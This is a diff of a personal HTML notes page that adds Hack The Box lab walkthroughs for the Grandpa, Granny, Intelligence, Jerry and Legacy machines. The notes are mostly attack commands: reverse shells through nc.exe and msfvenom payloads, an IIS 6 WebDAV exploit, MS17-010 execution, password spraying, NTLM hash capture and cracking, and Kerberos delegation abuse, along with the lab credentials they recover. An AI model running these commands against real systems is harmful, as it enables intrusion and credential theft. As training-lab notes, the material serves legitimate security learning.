@@ -309,7 +309,7 @@
     <div id="particles-js"></div>
     <header>
         <h2 class="glow"># joe95's Notes</h2>
-        <br><span>last_update:Dec.19.2023</span>
+        <br><span>last_update:Dec.20.2023</span>
         <script src="displayVisitorInfo.js"></script>
         <br><span id="visitorInfo"></span>
     </header>
@@ -2270,93 +2270,108 @@
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Grandpa (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Grandpa (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>Failed: Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow /usr/share/exploitdb/exploits/windows/remote/41738.py
+                        <br>but when `searchsploit -m 41738` shows 'Codes: CVE-2017-7269' 
+                        <br>https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell
+                        <br>https://github.com/crypticdante/CVE-2017-7269/blob/main/ii6_reverse_shell.py
+                        <br>`python2 ./iis6-CVE-2017-7269.py 10.10.10.14 80 10.10.14.4 9001`
+                        <br><span class="step_title">Privilege_escalation(network service->system)</span>
+                        <br>`whoami /all` found 'SeImpersonatePrivilege Enabled' and `systeminfo` show its windows server 2003
+                        <br>https://github.com/Re4son/Churrasco/blob/master/churrasco.exe
+                        <br>upload nc.exe and churrasco.exe as c.exe
+                        <br>`.\c.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.4 9002"`
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Granny (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Granny (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>nmap scan shows tcp80 has:
+                        <br>Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+                        <br>Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+                        <br>`davtest -url http://10.10.10.15` found PUT success on .txt .jhtml .pl .php .html .cfm .jsp also found MKCOL success which mean we can create dir in webroot
+                        <br>`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.4 lport=9001 -f aspx -o payload.aspx`
+                        <br>`curl -X PUT http://10.10.10.15/payload.txt --data-binary @payload.aspx`
+                        <br>`curl -X MOVE -H "destination:http://10.10.10.15/payload.aspx" http://10.10.10.15/payload.txt`
+                        <br>`curl http://10.10.10.15/payload.aspx`
+                        <br><span class="step_title">Privilege_escalation(network service->system)</span>
+                        <br>we can use churrasco.exe the same way in 'Granny' machine
+                        <br>OR `python2 ~/tool/Windows-Exploit-Suggester-master/windows-exploit-suggester.py -i systeminfo.txt -d 2023-12-18-mssb.xls`
+                        <br>MS14-058 works as 0xdf shown in his walkthough
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Intelligence (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Intelligence (Medium/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>gobuster dir found /documents with 2020-01-01-upload.pdf and 2020-12-15-upload.pdf
+                        <br>`exiftool ./*.pdf` found Creator 'William.Lee' 'Jose.Williams' save as users
+                        <br>`kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users` both valid
+                        <br>Failed: `GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/Jose.Williams`
+                        <br>Failed: `GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/William.Lee`
+                        <br>`date --date='1336 day ago' +%Y-%m-%d-upload.pdf` output: 2020-01-01-upload.pdf
+                        <br>`for i in $(seq 1336 1701);do  date --date="$i day ago" +%Y-%m-%d-upload.pdf >> pdffilenames.txt ; done`
+                        <br>`for i in $(cat ./pdffilenames.txt);do wget http://10.10.10.248/documents/$i;done`
+                        <br>`exiftool *.pdf | grep Creator | awk  '{print $3}' | sort -u > usernames.txt` which has 30 usernames
+                        <br>`for f in *.pdf; do pdftotext $f;done`
+                        <br>`find . -type f -exec grep -H pass {} \; 2>/dev/null`
+                        <br>found default password: NewIntelligenceCorpUser9876 from 2020-06-04-upload.txt
+                        <br>`kerbrute_linux_amd64 userenum -d intelligence.htb --dc 10.10.10.248 usernames.txt` all valid
+                        <br>`kerbrute_linux_amd64 passwordspray usernames.txt NewIntelligenceCorpUser9876 -d intelligence.htb --dc 10.10.10.248`
+                        <br>`crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876 --continue-on-success` found Tiffany.Molina:NewIntelligenceCorpUser9876
+                        <br>`smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248` readable shares: IPC$,IT,NETLOGON,SYSVOL,Users
+                        <br>smb: \Tiffany.Molina\desktop\> get user.txt
                         <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <!-- ---------------------------------------170--------------------------------------- -->
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Jerry (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                    </div>
-                </div>
-                <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Legacy (difficulty/Windows)</span> </button>                    
-                    <div class="sub_dropdown_content">
-                        <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>`bloodhound-python -c ALL -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248`
+                        <br>Nothing interesting in bloodhound now
+                        <br>//10.10.10.248/IT found downdetector.ps1
+                        <br>The script goes into LDAP and gets a list of all the computers, and then loops over the ones where the name starts with “web”. It will try to issue a web request to that server (with the running users’s credentials), and if the status code isn’t 200, it will email Ted.Graves and let them know that the host is down. The comment at the top says it is scheduled to run every five minutes.
+                        <br>we can use dnstool.py from https://github.com/dirkjanm/krbrelayx to add a new record that point to us
+                        <br>`python3 dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web-test --data 10.10.14.19 --type A intelligence.htb`
+                        <br>and use responder to catch hash
+                        <br>`responder -I tun0`  [HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:417b3c7a8c22d213:59F3EF3E1BE8AA2ACE043DCAF558B42E:010100000000000021FE40A48EDAD901FBF217B931C941D1000000000200080047004E004E00450001001E00570049004E002D004600530059004D0057003100330032004700380043000400140047004E004E0045002E004C004F00430041004C0003003400570049004E002D004600530059004D0057003100330032004700380043002E0047004E004E0045002E004C004F00430041004C000500140047004E004E0045002E004C004F00430041004C00080030003000000000000000000000000020000002A945F0608FA9810B3048A293EB361DCF404AB75A453A574D12289448307CA50A001000000000000000000000000000000000000900340048005400540050002F0077006500620031002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+                        <br>`john ntlm2.txt --wordlist=/usr/share/wordlists/rockyou.txt` got cred Ted.Graves:Mr.Teddy
+                        <br>`bloodhound-python -c ALL -u Ted.Graves -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248`
+                        <br>user 'Ted.Graves' is in 'ITSupport' group which has 'ReadGMSAPassword' on user 'SVC_INT' which has 'AllowedToDelegate' on the Domain_Controller
+                        <br>`gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248` got hash svc_int$:::87c12d4a0641b2b17fb5620cc2db2ca8
+                        <br>`ntpdate -s 10.10.10.248` VM time will reset after 30s unless we turn it off `service virtualbox-guest-utils stop`
+                        <br>Bloodhound>>svc_int>>Node_Info>>Node_Properties>>AllowedToDelegate: WWW/dc.intelligence.htb
+                        <br>`getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :87c12d4a0641b2b17fb5620cc2db2ca8`
+                        <br>`export KRB5CCNAME=Administrator.ccache`
+                        <br>`psexec.py -no-pass -k dc.intelligence.htb`  'system_shell'
+                        <br>OR `KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb`  'administrator_shell'
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Love (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Jerry (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>tcp8080 default tomcat page login manager with default cred of tomcat:s3cret
+                        <br>I use `msfvenom -p java/shell_reverse_tcp lhost=10.10.14.3 lport=9001 -f war -o pwn.war`
+                        <br>upload and click and listener got system shell
+                        <br>0xdf use `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war`
+                        <br>`jar -ft rev_shell-9002.war` shows 'ppaejmsg.jsp'
+                        <br>trigger manually with `curl http://10.10.10.95:8080/rev_shell-9002/ppaejmsg.jsp`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Legacy (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>`nmap --script=smb-vuln* 10.10.10.4` found MS17-010 and MS-08-067(0xdf did)
+                        <br>`msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.11 lport=9001 -f exe -o 9001.exe`
+                        <br>`python2 ~/tool/windows-kernel-exploits-master/MS17-010/MS17-010_CVE-2017-0143-main/checker.py 10.10.10.4`
+                        <br>output seems test some 'pipe names' spoolss: Ok (32 bit)  browser: Ok (32 bit)
+                        <br>`python2 ~/tool/windows-kernel-exploits-master/MS17-010/MS17-010_CVE-2017-0143-main/send_and_execute.py 10.10.10.4 9001.exe 445 browser`
+                        <br>and listener got a shell which can read both flags
+                        <br>Note: this machine do not have whoami.exe which I end up upload one and found it's a system shell
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Love (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
                         <br>
